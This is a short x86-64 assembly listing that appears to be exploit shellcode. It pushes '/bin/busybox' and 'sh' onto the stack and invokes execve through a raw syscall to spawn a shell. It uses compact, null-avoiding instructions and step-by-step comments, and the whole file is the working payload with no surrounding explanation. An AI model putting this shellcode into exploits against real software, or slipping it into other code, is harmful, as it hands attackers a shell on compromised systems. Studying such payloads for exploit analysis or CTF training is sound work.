bits 64

    mov ax, 0x6873     ; push "sh"
    cwde
    push rax

    push rsp
    pop rcx            ; rcx = "sh"


    push dword 0x786f6279       ; == "xoby"
    mov rax, 0x7375622f6e69622f ; == "sub/nib/"
    push rax                    ; push "bin/busybox"

    push rsp            ; rdi = "/bin/busybox".
    pop rdi

    cdq                 ; edx = 0 (works because SIGN(rax) == 0)
    push rdx            ; push argv terminator.

    push rcx            ; push "sh" == argv[1].

    push rdi            ; push "/bin/busybox" == argv[0].

    push rsp
    pop rsi             ; rsi = argv.

    push 59
    pop rax
    syscall             ; execve("/bin/busybox", {"/bin/busybox", "sh", NULL}, NULL)





    ; sh\x00...
    ; NULL
    ; ybox\x00..
    ; /bin/bus




